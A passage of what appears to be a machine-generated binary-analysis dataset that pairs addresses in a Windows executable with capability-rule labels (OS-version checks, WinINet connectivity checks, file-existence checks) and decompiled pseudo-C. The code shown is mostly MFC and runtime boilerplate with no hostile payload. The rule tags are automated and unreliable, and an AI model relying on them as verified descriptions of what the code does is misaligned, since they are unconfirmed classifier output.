0x20), 1, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c), arg_8h_00, iVar2);\n            if (iVar5 != 0) {\n                uVar7 = (*_sym.imp.KERNEL32.dll_CompareStringW)\n                                  (*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x34), iVar6, arg_8h_00, iVar2);\n                *(unaff_EBP + -0x40) = uVar7;\n            }\n            if (*(unaff_EBP + -0x44) != 0) {\n                fcn.0041ba6d(arg_8h_00);\n            }\n        }\n    }\ncode_r0x00426be7:\n    if (*(unaff_EBP + -0x3c) != 0) {\n        fcn.0041ba6d(*(unaff_EBP + -0x34));\n    }\ncode_r0x00426cac:\n    *(unaff_EBP + -0x60) = 0x426cb7;\n    fcn.0041c6de();\n    *(unaff_EBP + -0x60) = 0x426cbc;\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 2847
    },
    "00426d0a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * fcn.00426d0a(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *unaff_EDI;\n    uint var_4h;\n    \n    iVar3 = 0;\n    if (unaff_EDI != NULL) {\n        iVar1 = *unaff_EDI;\n        piVar2 = unaff_EDI;\n        while (iVar1 != 0) {\n            piVar2 = piVar2 + 1;\n            iVar3 = iVar3 + 1;\n            iVar1 = *piVar2;\n        }\n        piVar2 = fcn.0041ba5b(iVar3 * 4 + 4);\n        if (piVar2 == NULL) {\n            fcn.0041c147(9);\n        }\n        iVar3 = *unaff_EDI;\n        piVar4 = piVar2;\n        while (iVar3 != 0) {\n            iVar3 = fcn.0041cc2b(iVar3);\n            *piVar4 = iVar3;\n            piVar4 = piVar4 + 1;\n            unaff_EDI = unaff_EDI + 1;\n            iVar3 = *unaff_EDI;\n        }\n        *piVar4 = 0;\n        return piVar2;\n    }\n    return unaff_EDI;\n}\n",
        "token_count": 310
    },
    "0042772b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0042772b(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    iVar1 = fcn.00431a77();\n    if ((*(iVar1 + 0x24) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.00428f9f(0x42fc99);\n        iVar3 = fcn.00428fb1(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.0042dd8c(0x4389e4, 0x431769, 0x43229d, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x24) = uVar4;\n        fcn.00428f9f(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x24);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 367
    },
    "0042de10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl\nfcn.0042de10(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    int32_t *piVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    arg_8h_00 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = &stack0xffffffec;\n    if (arg_8h_00 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        iVar1 = fcn.00427f64(arg_8h_00);\n        if (iVar1 == 0) {\n            iVar1 = fcn.00427f64(arg_8h_00);\n            if (iVar1 == 0) {\n                uVar2 = fcn.00428f9f(0x42fc99);\n                *(unaff_EBP + -4) = 0;\n                *(unaff_EBP + 8) = uVar2;\n                iVar1 = fcn.0041ae80();\n                if (iVar1 == 0) {\n                    fcn.00427582();\n                }\n                (**(extraout_ECX + 0x14))(iVar1);\n                piVar3 = fcn.004280dc(arg_8h_00);\n                uVar2 = *(unaff_EBP + 8);\n                *(unaff_EBP + -4) = 0xffffffff;\n                *piVar3 = iVar1;\n                fcn.00428f9f(uVar2);\n                piVar3 = *(extraout_ECX + 0x58) + iVar1;\n                *piVar3 = arg_8h_00;\n                if (*(extraout_ECX + 0x5c) == 2) {\n                    piVar3[1] = arg_8h_00;\n                }\n            }\n            else {\n                piVar3 = *(extraout_ECX + 0x58) + iVar1;\n                *piVar3 = arg_8h_00;\n                if (*(extraout_ECX + 0x5c) == 2) {\n                    piVar3[1] = arg_8h_00;\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar1;\n}\n",
        "token_count": 613
    },
    "00427899": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00427899(code **param_1)\n\n{\n    uint uVar1;\n    \n    *param_1 = vtable.CImageList.0;\n    if (param_1[1] == NULL) {\n        return 0;\n    }\n    uVar1 = fcn.004277a7();\n    uVar1 = (*_sym.imp.COMCTL32.dll_ImageList_Destroy)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 99
    },
    "00427b8e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427b8e(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    uint uStack8;\n    \n    if (*(param_1 + 0x10) == 0) {\n        uStack8 = 0xc;\n        iVar1 = fcn.00427e55(param_1 + 0x14, *(param_1 + 0x18));\n        iVar3 = *(param_1 + 0x18);\n        puVar2 = iVar1 + -8 + iVar3 * 0xc;\n        if (-1 < iVar3 + -1) {\n            do {\n                *puVar2 = *(param_1 + 0x10);\n                *(param_1 + 0x10) = puVar2;\n                puVar2 = puVar2 + -3;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    puVar2 = *(param_1 + 0x10);\n    *(param_1 + 0x10) = *puVar2;\n    puVar2[1] = uStack8;\n    *puVar2 = unaff_ESI;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    puVar2[2] = 0;\n    return;\n}\n",
        "token_count": 320
    },
    "00427e55": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00427e55(uint *param_1, int32_t param_2, int32_t param_3)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    \n    if ((param_2 != 0) && (param_3 != 0)) {\n        puVar2 = fcn.00428fb1(param_2 * param_3 + 4);\n        *puVar2 = *param_1;\n        *param_1 = puVar2;\n        return;\n    }\n    fcn.004275b6();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 143
    },
    "00427e9c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00427e9c(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        param_2 = 0x11;\n    }\n    if (*(param_1 + 4) != 0) {\n        fcn.00428fdc(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    if (param_3 != 0) {\n        uVar1 = fcn.00428fb1(param_2 << 2);\n        *(param_1 + 4) = uVar1;\n        fcn.0041cc60(uVar1, 0, param_2 << 2);\n    }\n    *(param_1 + 8) = param_2;\n    return;\n}\n",
        "token_count": 196
    },
    "00428091": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428091(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    if (*(param_1 + 0x10) == 0) {\n        iVar2 = fcn.00427e55(param_1 + 0x14, *(param_1 + 0x18), 0xc);\n        iVar4 = *(param_1 + 0x18);\n        puVar3 = iVar2 + -8 + iVar4 * 0xc;\n        if (-1 < iVar4 + -1) {\n            do {\n                *puVar3 = *(param_1 + 0x10);\n                *(param_1 + 0x10) = puVar3;\n                puVar3 = puVar3 + -3;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n    }\n    puVar3 = *(param_1 + 0x10);\n    uVar1 = *puVar3;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    *(param_1 + 0x10) = uVar1;\n    puVar3[1] = 0;\n    puVar3[2] = 0;\n    return;\n}\n",
        "token_count": 303
    },
    "004283d4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004283d4(uint lpString2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalLock;\n    if (*(in_ECX + 0x70) != 0) {\n        var_4h = in_ECX;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*(in_ECX + 0x70));\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*(iVar2 + 2) + iVar2, lpString2);\n        if ((iVar2 == 0) && (iVar2 = sub.WINSPOOL.DRV_OpenPrinterA(lpString2, &var_4h, 0),  iVar2 != 0)) {\n            if (*(in_ECX + 0x6c) != 0) {\n                fcn.0042fc69(*(in_ECX + 0x6c));\n            }\n            uVar3 = sub.WINSPOOL.DRV_DocumentPropertiesA(0, var_4h, lpString2, 0, 0, 0);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x42, uVar3);\n            *(in_ECX + 0x6c) = uVar3;\n            uVar3 = (*pcVar1)(uVar3);\n            iVar2 = sub.WINSPOOL.DRV_DocumentPropertiesA(0, var_4h, lpString2, uVar3, 0, 2);\n            if (iVar2 != 1) {\n                fcn.0042fc69(*(in_ECX + 0x6c));\n                *(in_ECX + 0x6c) = 0;\n            }\n            sub.WINSPOOL.DRV_ClosePrinter(var_4h);\n        }\n    }\n    return;\n}\n",
        "token_count": 432
    },
    "004286b5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.004286b5(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    iVar1 = fcn.00431a77();\n    if (((*(iVar1 + 4) != 0) && (*param_1 == 0)) && (iVar1 = fcn.00428620(param_1),  iVar1 != 0)) {\n        return 1;\n    }\n    piVar2 = fcn.00411a01();\n    piVar4 = piVar2;\n    if (piVar2 != NULL) {\n        piVar4 = piVar2[7];\n    }\n    iVar1 = fcn.0042b218(piVar4, param_1);\n    if (iVar1 == 0) {\n        if (piVar2 != NULL) {\n            fcn.0042aeb1(*param_1);\n            piVar4 = fcn.0042bb73();\n            if (piVar4 != piVar2) {\n                uVar3 = (**(*piVar2 + 0x100))(param_1);\n                return uVar3;\n            }\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 298
    },
    "004289d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004289d0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.00431a51();\n    if (*(iVar1 + 0x14) == '\\0') {\n        iVar1 = fcn.00431a41();\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        uVar2 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(0xffffffff, 0x428852, 0, uVar2);\n        *(iVar1 + 0x2c) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "00428c44": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00428c44(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint32_t arg_ch_00;\n    int32_t *piVar4;\n    \n    if (arg_ch == 0xfffffffe) {\n        iVar1 = fcn.00431a51();\n        iVar1 = (**(**(iVar1 + 0x1038) + 4))();\n        return iVar1;\n    }\n    if (arg_ch == 0xfffffffd) {\n        iVar1 = *(arg_10h + 0x30);\n        arg_ch = 0;\n        puVar2 = (**(*in_ECX + 0x2c))();\n        do {\n            if (puVar2 == NULL) {\n                return arg_ch;\n            }\n            if (arg_ch != 0) {\n                return arg_ch;\n            }\n            piVar4 = puVar2[1];\n            while (((piVar4[1] != 0 && (piVar4[2] != 0)) && (arg_ch == 0))) {\n                if (arg_8h == piVar4[1]) {\n                    if (iVar1 == 0) {\n                        if (*piVar4 == 0) {\ncode_r0x00428cd0:\n                            *(arg_10h + 4) = piVar4[2];\n                            arg_ch = 1;\n                        }\n                    }\n                    else if ((*piVar4 != 0) && (iVar3 = fcn.00411a2f(iVar1, *piVar4),  iVar3 != 0))\n                    goto code_r0x00428cd0;\n                }\n                piVar4 = piVar4 + 3;\n            }\n            puVar2 = *puVar2;\n        } while( true );\n    }\n    if (arg_ch != 0xffffffff) {\n        arg_ch_00 = arg_ch >> 0x10;\n        arg_ch = arg_ch & 0xffff;\n        if (arg_ch_00 != 0) goto code_r0x00428d09;\n    }\n    arg_ch_00 = 0x111;\ncode_r0x00428d09:\n    puVar2 = (**(*in_ECX + 0x28))();\n    while( true ) {\n        if (puVar2 == NULL) {\n            return 0;\n        }\n        iVar1 = fcn.00429c9d(puVar2[1], arg_ch_00, arg_ch, arg_8h);\n        if (iVar1 != 0) break;\n        puVar2 = *puVar2;\n    }\n    iVar1 = fcn.00428b2e(in_ECX, arg_8h, arg_ch, *(iVar1 + 0x14), arg_10h, *(iVar1 + 0x10), arg_14h);\n    return iVar1;\n}\n",
        "token_count": 666
    },
    "00429026": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00429026(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CDialog.0;\n    *(unaff_EBP + -4) = 0;\n    if (extraout_ECX[7] != NULL) {\n        fcn.0042b107();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042b5ae();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 197
    },
    "0042975d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: hResData\n// WARNING: Variable defined which should be unmapped: hWnd\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nint32_t fcn.0042975d(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t noname_0;\n    uint noname_1;\n    uint32_t uVar3;\n    int32_t *extraout_ECX;\n    uint unaff_EBX;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    uint var_10h;\n    int32_t *noname_4;\n    uint var_20h;\n    uint var_1ch;\n    uint hResData;\n    uint hWnd;\n    uint in_stack_ffffffec;\n    uint var_ch;\n    uint in_stack_fffffff4;\n    uint var_4h;\n    uint noname_13;\n    \n    noname_13 = 0x429767;\n    fcn.0041c77c();\n    iVar1 = extraout_ECX[0x16];\n    noname_0 = extraout_ECX[0x17];\n    *(unaff_EBP + -0x10) = &fcn.0042975d::var_20h;\n    *(unaff_EBP + -0x1c) = extraout_ECX;\n    *(unaff_EBP + -0x18) = iVar1;\n    var_20h = unaff_EDI;\n    var_1ch = unaff_ESI;\n    hResData = unaff_EBX;\n    iVar1 = fcn.00431a51();\n    uVar4 = *(iVar1 + 0xc);\n    if (extraout_ECX[0x15] != 0) {\n        iVar1 = fcn.00431a51();\n        uVar4 = *(iVar1 + 0xc);\n        uVar2 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar4, extraout_ECX[0x15], 5);\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar4, uVar2);\n        *(unaff_EBP + -0x18) = uVar2;\n    }\n    if (*(unaff_EBP + -0x18) != 0) {\n        noname_0 = (*_sym.imp.KERNEL32.dll_LockResource)(*(unaff_EBP + -0x18));\n    }\n    if (noname_0 == 0) {\n        iVar1 = -1;\n    }\n    else {\n        uVar2 = fcn.0042929d();\n        *(unaff_EBP + -0x14) = uVar2;\n        fcn.0042af59();\n        *(unaff_EBP + -0x20) = 0;\n        if (*(unaff_EBP + -0x14) != 0) {\n            iVar1 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n            if (*(unaff_EBP + -0x14) != iVar1) {\n                iVar1 = (*_sym.imp.USER32.dll_IsWindowEnabled)(*(unaff_EBP + -0x14));\n                if (iVar1 != 0) {\n                    (*_sym.imp.USER32.dll_EnableWindow)(*(unaff_EBP + -0x14), 0);\n                    *(unaff_EBP + -0x20) = 1;\n                }\n            }\n        }\n        *(unaff_EBP + -4) = 0;\n        noname_4 = extraout_ECX;\n        fcn.0042c1a4();\n        uVar2 = *(unaff_EBP + -0x14);\n        noname_1 = fcn.0042aeb1();\n        iVar1 = fcn.00429550(noname_0, noname_1, uVar4, uVar2, noname_4, var_20h, var_1ch, hResData, hWnd, \n                             in_stack_ffffffec, var_ch, in_stack_fffffff4, var_4h, noname_13, unaff_retaddr, param_1, \n                             param_2, param_3, var_10h, param_5, param_6);\n        if (iVar1 != 0) {\n            if ((*(extraout_ECX + 0xe) & 0x10) != 0) {\n                uVar4 = 4;\n                uVar3 = fcn.0042ce20();\n                if ((uVar3 & 0x100) != 0) {\n                    uVar4 = 5;\n                }\n                fcn.0042a955(uVar4);\n            }\n            if (extraout_ECX[7] != 0) {\n                fcn.0042d06e(0, 0, 0, 0, 0, 0x97);\n            }\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x20) != 0) {\n            (*_sym.imp.USER32.dll_EnableWindow)(*(unaff_EBP + -0x14), 1);\n        }\n        if (*(unaff_EBP + -0x14) != 0) {\n            iVar1 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n            if (iVar1 == extraout_ECX[7]) {\n                (*_sym.imp.USER32.dll_SetActiveWindow)(*(unaff_EBP + -0x14));\n            }\n        }\n        (**(*extraout_ECX + 0x60))();\n        fcn.004292d7();\n        if (extraout_ECX[0x15] != 0) {\n            (*_sym.imp.KERNEL32.dll_FreeResource)(*(unaff_EBP + -0x18));\n        }\n        iVar1 = extraout_ECX[0x10];\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar1;\n}\n",
        "token_count": 1425
    },
    "00429b65": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpWndClass\n\nuint __cdecl\nfcn.00429b65(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint lpWndClass;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = &lpWndClass;\n    iVar4 = (*_sym.imp.USER32.dll_GetClassInfoA)(*(iVar1 + 0x10), *(iVar1 + 0x24), unaff_EBP + -0x40);\n    if (iVar4 != 0) {\n        uVar5 = 1;\n        goto code_r0x00429c45;\n    }\n    iVar3 = (*_sym.imp.USER32.dll_RegisterClassA)(iVar1);\n    if (iVar3 == 0) {\ncode_r0x00429bea:\n        uVar5 = 0;\n    }\n    else {\n        *(unaff_EBP + -0x18) = 1;\n        iVar4 = fcn.00431a51();\n        if (*(iVar4 + 0x14) != '\\0') {\n            fcn.00432c08(1);\n            *(unaff_EBP + -4) = 0;\n            iVar4 = fcn.00431a51();\n            pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n            *(unaff_EBP + -0x14) = iVar4 + 0x34;\n            iVar4 = (*pcVar2)(iVar4 + 0x34);\n            iVar6 = (*pcVar2)(*(iVar1 + 0x24));\n            if (0xfff < iVar4 + 2 + iVar6) goto code_r0x00429bea;\n            uVar7 = (*pcVar2)(*(unaff_EBP + -0x14));\n            uVar5 = *(iVar1 + 0x24);\n            *(unaff_EBP + 8) = uVar7;\n            iVar4 = (*pcVar2)(uVar5);\n            pcVar2 = _sym.imp.KERNEL32.dll_lstrcatA;\n            if (*(unaff_EBP + 8) + 2 + iVar4 < 0x1000) {\n                (*_sym.imp.KERNEL32.dll_lstrcatA)(*(unaff_EBP + -0x14), *(iVar1 + 0x24));\n                *(unaff_EBP + 10) = 10;\n                *(unaff_EBP + 0xb) = 0;\n                (*pcVar2)(*(unaff_EBP + -0x14), unaff_EBP + 10);\n            }\n            else {\n                uVar5 = *(iVar1 + 0x10);\n                *(unaff_EBP + -0x18) = 0;\n                (*_sym.imp.USER32.dll_UnregisterClassA)(*(iVar1 + 0x24), uVar5);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00432c6b(1);\n        }\n        uVar5 = *(unaff_EBP + -0x18);\n    }\ncode_r0x00429c45:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar5;\n}\n",
        "token_count": 928
    },
    "00429c9d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00429c9d(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    while( true ) {\n        if (arg_8h[4] == 0) {\n            return NULL;\n        }\n        if ((((arg_ch == *arg_8h) && (arg_10h == arg_8h[1])) && (arg_8h[2] <= arg_14h)) &&\n           (arg_14h < arg_8h[3] || arg_14h == arg_8h[3])) break;\n        arg_8h = arg_8h + 6;\n    }\n    return arg_8h;\n}\n",
        "token_count": 169
    },
    "0042ae35": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0042ae35(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    iVar1 = fcn.00431a77();\n    if ((*(iVar1 + 0x14) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.00428f9f(0x42fc99);\n        iVar3 = fcn.00428fb1(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.0042dd8c(0x438dbc, 0x431b3d, 0x43229d, 0x1c, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x14) = uVar4;\n        fcn.00428f9f(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x14);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 370
    },
    "0042af59": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
